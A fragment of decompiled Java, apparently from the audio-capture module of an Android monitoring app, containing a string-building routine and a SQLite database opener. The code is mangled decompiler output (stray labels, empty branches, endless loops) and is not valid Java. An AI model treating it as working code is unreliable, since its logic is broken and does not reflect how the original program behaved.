      bool2 = c;
      if (!bool2) {
        break label67;
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return localStringBuilder.toString();
      label67:
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  private static SQLiteDatabase c(String paramString, int paramInt)
  {
    for (SQLiteDatabase localSQLiteDatabase = null;; localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt))
    {
      try
      {
        localFile = new java/io/File;
        localFile.<init>(paramString);
        bool = localFile.exists();
        if (bool) {
          break label34;
        }
        bool = c;
        if (!bool) {}
      }
      catch (SQLiteException localSQLiteException)
      {
        for (;;)
        {
          File localFile;
          label34:
          boolean bool = c;
          if (!bool) {}
        }
      }
      return localSQLiteDatabase;
      bool = false;
      localFile = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/audio/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */